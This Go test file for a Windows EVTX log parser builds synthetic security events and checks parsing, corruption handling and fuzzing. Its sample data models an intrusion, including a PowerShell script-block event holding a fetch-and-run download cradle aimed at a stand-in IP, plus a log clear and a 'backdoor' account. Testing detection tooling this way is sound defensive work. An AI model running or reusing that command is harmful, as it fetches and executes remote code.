package evtx

import (
	"bytes"
	"context"
	"encoding/binary"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/ciruzz00/astro/internal/logs"
)

var t0 = time.Date(2026, 10, 11, 21, 0, 0, 123456700, time.UTC)

// system is the System element shared by the test templates; substitution
// indexes 0-4 are provider, event id, time, record id and computer.
func system(channel string) xel {
	return el("System",
		el("Provider").with(xattr{name: "Name", sub: 0}),
		sub("EventID", 1),
		el("TimeCreated").with(xattr{name: "SystemTime", sub: 2}),
		sub("EventRecordID", 3),
		lit("Channel", channel),
		sub("Computer", 4),
		el("Security").with(xattr{name: "UserID", sub: 5}),
	)
}

func sysValues(provider string, id uint16, t time.Time, rec uint64) []tval {
	return []tval{vString(provider), vU16(id), vTime(t), vU64(rec), vString("DC01.example.com"), vSID(5, 18)}
}

var logonTemplate = el("Event", system("Security"), el("EventData",
	data("TargetUserName", 6), data("TargetDomainName", 7), data("IpAddress", 8),
	data("LogonType", 9), data("TargetLogonId", 10), data("LogonGuid", 11), data("ProcessName", 12),
))

func logon(id uint16, user, ip string, rec uint64, t time.Time) *record {
	vals := append(sysValues("Microsoft-Windows-Security-Auditing", id, t, rec),
		vString(user), vString("EXAMPLE"), vString(ip), vU32(3), vHex64(0x3e7), vGUID(), vString(`C:\Windows\System32\svchost.exe`))
	return &record{tmplID: 1, tmpl: logonTemplate, vals: vals}
}

func cleared(rec uint64, t time.Time) *record {
	inner := &record{tmplID: 3, tmpl: el("LogFileCleared", sub("SubjectUserName", 0), sub("SubjectDomainName", 1)),
		vals: []tval{vString("mallory"), vString("EXAMPLE")}}
	tmpl := el("Event", system("Security"), xel{name: "UserData", sub: 6})
	vals := append(sysValues("Microsoft-Windows-Eventlog", 1102, t, rec), tval{typ: tBinXML, nested: inner})
	return &record{tmplID: 2, tmpl: tmpl, vals: vals}
}

func scriptBlock(rec uint64, t time.Time, script string) *record {
	tmpl := el("Event", system("Microsoft-Windows-PowerShell/Operational"),
		el("EventData", data("MessageNumber", 6), data("ScriptBlockText", 7), data("Path", 8)))
	vals := append(sysValues("Microsoft-Windows-PowerShell", 4104, t, rec), vU32(1), vString(script), vNull())
	return &record{tmplID: 4, tmpl: tmpl, vals: vals}
}

func sampleFile(t *testing.T) []byte {
	t.Helper()
	c1 := newChunk(1)
	c1.record(logon(4625, "administrator", "::ffff:203.0.113.9", 1, t0), t0)
	c1.record(logon(4624, "administrator", "203.0.113.9", 2, t0.Add(time.Second)), t0.Add(time.Second))
	c1.raw([]byte{tokFragmentHeader, 1, 1, 0, 0x7f}) // unknown token
	c1.record(cleared(4, t0.Add(2*time.Second)), t0.Add(2*time.Second))
	c2 := newChunk(5)
	c2.record(scriptBlock(5, t0.Add(3*time.Second), "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')"), t0.Add(3*time.Second))
	c2.record(logon(4624, "svc_backup", "-", 6, t0.Add(4*time.Second)), t0.Add(4*time.Second))
	return buildFile(c1.finish(), make([]byte, chunkSize), c2.finish())
}

func parseAll(t *testing.T, b []byte) ([]*logs.Event, logs.Stats) {
	t.Helper()
	var out []*logs.Event
	st, err := New().Parse(context.Background(), bytes.NewReader(b), logs.Options{Source: "Security.evtx"}, func(e *logs.Event) error {
		out = append(out, e)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return out, st
}

func TestParse(t *testing.T) {
	evs, st := parseAll(t, sampleFile(t))
	if st.Errors != 1 || st.Events != 5 || len(evs) != 5 {
		t.Fatalf("stats = %+v, events = %d", st, len(evs))
	}

	failed := evs[0]
	if failed.EventID != 4625 || failed.Kind != KindEvent || failed.Channel != "Security" || failed.Host != "DC01.example.com" ||
		failed.Provider != "Microsoft-Windows-Security-Auditing" || failed.User != "administrator" || failed.SrcIP != "203.0.113.9" ||
		!failed.Time.Equal(t0) || failed.Severity != logs.Low || failed.Source != "Security.evtx" {
		t.Errorf("4625 = %+v", failed)
	}
	f := failed.Fields
	if f["LogonType"] != "3" || f["TargetLogonId"] != "0x3e7" || f["LogonGuid"] != "{01234567-89AB-CDEF-0123-456789ABCDEF}" ||
		f["record_id"] != "1" || f["user_sid"] != "S-1-5-18" || f["TargetDomainName"] != "EXAMPLE" {
		t.Errorf("4625 fields = %v", f)
	}
	if failed.Process != `C:\Windows\System32\svchost.exe` || failed.Ref.Record != "record 1, chunk 0" {
		t.Errorf("process/ref = %q %q", failed.Process, failed.Ref.Record)
	}
	if failed.Message != `Failed logon: user administrator, from 203.0.113.9, logon type 3, process C:\Windows\System32\svchost.exe` {
		t.Errorf("message = %q", failed.Message)
	}
	if !strings.Contains(failed.Raw, `<Data Name="TargetUserName">administrator</Data>`) ||
		!strings.Contains(failed.Raw, `<TimeCreated SystemTime="2026-10-11T21:00:00.1234567Z"/>`) {
		t.Errorf("raw = %s", failed.Raw)
	}

	// Second record: same template and names, shared by offset.
	if e := evs[1]; e.EventID != 4624 || e.SrcIP != "203.0.113.9" || e.Fields["record_id"] != "2" {
		t.Errorf("4624 = %+v", e)
	}

	clear := evs[2]
	if clear.EventID != 1102 || clear.Severity != logs.High || clear.User != "mallory" || clear.Fields["SubjectDomainName"] != "EXAMPLE" ||
		!strings.HasPrefix(clear.Message, "Security audit log cleared") {
		t.Errorf("1102 = %+v", clear)
	}
	if !strings.Contains(clear.Raw, "<UserData><LogFileCleared><SubjectUserName>mallory</SubjectUserName>") {
		t.Errorf("nested raw = %s", clear.Raw)
	}

	ps := evs[3]
	if ps.EventID != 4104 || !strings.Contains(ps.CommandLine, "DownloadString") || ps.Channel != "Microsoft-Windows-PowerShell/Operational" ||
		ps.Ref.Record != "record 5, chunk 2" {
		t.Errorf("4104 = %+v", ps)
	}
	if _, ok := ps.Fields["Path"]; ok {
		t.Error("null value stored as a field")
	}
	if e := evs[4]; e.SrcIP != "" || e.User != "svc_backup" {
		t.Errorf("'-' address = %+v", e)
	}
}

func TestGroupAndAccountEvents(t *testing.T) {
	tmpl := el("Event", system("Security"), el("EventData",
		data("MemberName", 6), data("MemberSid", 7), data("TargetUserName", 8), data("SubjectUserName", 9)))
	w := newChunk(1)
	w.record(&record{tmplID: 7, tmpl: tmpl, vals: append(sysValues("Microsoft-Windows-Security-Auditing", 4732, t0, 1),
		vString("-"), vString("S-1-5-21-1-2-3-1002"), vString("Administrators"), vString("mallory"))}, t0)
	w.record(&record{tmplID: 7, tmpl: tmpl, vals: append(sysValues("Microsoft-Windows-Security-Auditing", 4720, t0, 2),
		vNull(), vNull(), vString("backdoor"), vString("mallory"))}, t0)
	evs, _ := parseAll(t, buildFile(w.finish()))
	if g := evs[0]; g.User != "mallory" || g.Severity != logs.Medium ||
		g.Message != "Member added to a local security group: group Administrators, member S-1-5-21-1-2-3-1002, by mallory" {
		t.Errorf("4732 = %q %q", g.User, g.Message)
	}
	if a := evs[1]; a.User != "backdoor" || a.Message != "User account created: account backdoor, by mallory" {
		t.Errorf("4720 = %q %q", a.User, a.Message)
	}
}

func TestCorruption(t *testing.T) {
	good := sampleFile(t)

	// A flipped byte in a record breaks the chunk checksum (counted) but the
	// other records are still read.
	bad := bytes.Clone(good)
	bad[fileHeaderSize+chunkHeaderSize+200] ^= 0xff
	evs, st := parseAll(t, bad)
	if st.Errors < 2 || len(evs) < 3 {
		t.Errorf("flipped byte: %d events, stats %+v", len(evs), st)
	}

	// A record written only in part (its tail is zero) is kept and flagged.
	w := newChunk(1)
	w.record(logon(4624, "alice", "203.0.113.9", 1, t0), t0)
	partial := w.finish()
	end := chunkHeaderSize + int(binary.LittleEndian.Uint32(partial[chunkHeaderSize+4:]))
	clear(partial[end-40 : end])
	evs, _ = parseAll(t, buildFile(partial))
	if len(evs) != 1 || evs[0].Fields["record_incomplete"] != "true" || evs[0].EventID != 4624 {
		t.Errorf("partial record = %+v", evs)
	}

	// A chunk without its signature is skipped.
	bad = bytes.Clone(good)
	copy(bad[fileHeaderSize:], "XXXXXXXX")
	evs, _ = parseAll(t, bad)
	if len(evs) != 2 {
		t.Errorf("bad chunk magic: %d events", len(evs))
	}

	// A truncated file keeps what was complete.
	evs, st = parseAll(t, good[:fileHeaderSize+2*chunkSize+100])
	if len(evs) != 3 || st.Errors != 2 {
		t.Errorf("truncated: %d events, stats %+v", len(evs), st)
	}

	// Wrong file header checksum: counted, records still read.
	bad = bytes.Clone(good)
	bad[100] = 1
	if evs, st = parseAll(t, bad); len(evs) != 5 || st.Errors != 2 {
		t.Errorf("header checksum: %d events, stats %+v", len(evs), st)
	}

	if _, err := New().Parse(context.Background(), strings.NewReader("not evtx"), logs.Options{}, func(*logs.Event) error { return nil }); err == nil {
		t.Error("short file accepted")
	}
	if _, err := New().Parse(context.Background(), bytes.NewReader(make([]byte, fileHeaderSize)), logs.Options{}, func(*logs.Event) error { return nil }); err == nil {
		t.Error("file without signature accepted")
	}
}

// TestTemplateAmplification fills a chunk with tiny records that all
// instantiate one large template: the chunk budget must stop the work.
func TestTemplateAmplification(t *testing.T) {
	big := make([]xel, 2000)
	for i := range big {
		big[i] = lit("D", "x")
	}
	w := newChunk(1)
	tmpl := el("Event", big...)
	for len(w.b) < chunkSize-200 {
		w.record(&record{tmplID: 9, tmpl: tmpl}, t0)
	}
	start := time.Now()
	evs, st := parseAll(t, buildFile(w.finish()))
	if time.Since(start) > 5*time.Second {
		t.Errorf("chunk took %v", time.Since(start))
	}
	if len(evs) == 0 || len(evs[0].Raw) > logs.MaxRaw+len("…") {
		t.Errorf("events %d, stats %+v", len(evs), st)
	}
}

func BenchmarkParse(b *testing.B) {
	file := sampleFile(&testing.T{})
	for b.Loop() {
		_, _ = New().Parse(context.Background(), bytes.NewReader(file), logs.Options{}, func(*logs.Event) error { return nil })
	}
}

func TestEmitStops(t *testing.T) {
	n := 0
	_, err := New().Parse(context.Background(), bytes.NewReader(sampleFile(t)), logs.Options{}, func(*logs.Event) error {
		if n++; n == 2 {
			return logs.ErrLimit
		}
		return nil
	})
	if err != logs.ErrLimit || n != 2 {
		t.Errorf("err = %v after %d events", err, n)
	}
}

func TestValues(t *testing.T) {
	le := binary.LittleEndian
	st := make([]byte, 16)
	for i, v := range []uint16{2026, 10, 0, 11, 21, 30, 5, 250} {
		le.PutUint16(st[2*i:], v)
	}
	tests := []struct {
		typ  byte
		b    []byte
		want string
	}{
		{tString, utf16le("héllo\x00"), "héllo"},
		{tAnsiString, []byte("abc\x00"), "abc"},
		{tInt8, []byte{0xff}, "-1"},
		{tInt8, []byte{0x7f}, "127"},
		{tInt16, le.AppendUint16(nil, 0x8000), "-32768"},
		{tInt32, le.AppendUint32(nil, 0xfffffffe), "-2"},
		{tInt64, le.AppendUint64(nil, 1<<63), "-9223372036854775808"},
		{tBool, le.AppendUint32(nil, 1), "true"},
		{tBinary, []byte{0xde, 0xad}, "DEAD"},
		{tSizeT, le.AppendUint64(nil, 0x7ff6), "0x7ff6"},
		{tSysTime, st, "2026-10-11T21:30:05.2500000Z"},
		{tFileTime, le.AppendUint64(nil, 0), "1601-01-01T00:00:00.0000000Z"},
		{tSID, vSID(5, 21, 1, 2, 3, 1001).b, "S-1-5-21-1-2-3-1001"},
		{tSID, []byte{1, 9, 0}, "0x010900"},
		{tHexInt32, le.AppendUint32(nil, 0x1f), "0x1f"},
		{tUInt32, []byte{1, 2}, "0x0102"}, // wrong size: shown as hex
		{tString | tArray, utf16le("a\x00b\x00"), "a, b"},
		{tUInt16 | tArray, []byte{1, 0, 2, 0}, "1, 2"},
		{tReal64, le.AppendUint64(nil, 0x3ff8000000000000), "1.5"},
		{0x7f, []byte{1}, "0x01"},
	}
	for _, tt := range tests {
		if got := formatValue(tt.typ, tt.b); got != tt.want {
			t.Errorf("formatValue(0x%02x, %x) = %q, want %q", tt.typ, tt.b, got, tt.want)
		}
	}
}

func FuzzParse(f *testing.F) {
	t := &testing.T{}
	f.Add(sampleFile(t))
	f.Fuzz(func(t *testing.T, b []byte) {
		_, err := New().Parse(context.Background(), bytes.NewReader(b), logs.Options{}, func(e *logs.Event) error {
			if !utf8.ValidString(e.Raw) || e.Kind != KindEvent {
				t.Fatalf("bad event %+v", e)
			}
			return nil
		})
		_ = err // malformed headers are errors; panics and hangs are what the fuzzer looks for
	})
}
